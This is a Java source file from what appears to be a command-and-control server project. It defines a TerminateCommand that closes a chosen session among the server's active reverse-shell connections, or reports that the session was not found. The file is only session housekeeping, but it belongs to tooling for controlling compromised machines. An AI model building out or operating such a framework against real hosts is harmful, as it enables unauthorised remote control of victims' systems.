package com.mtattab.c2cServer.service.commands.manager;

import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
import com.mtattab.c2cServer.service.Command;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.List;
import java.util.Optional;

@Slf4j
public class TerminateCommand implements Command {

    @Override
    public void execute(List<String> args, WebSocketSession currentSocket) {
        Optional<WebSocketSession> targetSessionToBeKilled = SocketUtil.findSessionByIdInSessionSet(
                ConnectionManager.activeReverseShellSessions ,args.get(1));


        if (targetSessionToBeKilled.isPresent()){
            SocketUtil.closeSession(targetSessionToBeKilled.get(), currentSocket);

        }else {
            SocketUtil.sendMessage(currentSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("session '%s' not found ", args.get(1)))
                    .success(false)
                    .build()
            )));
        }

    }



}
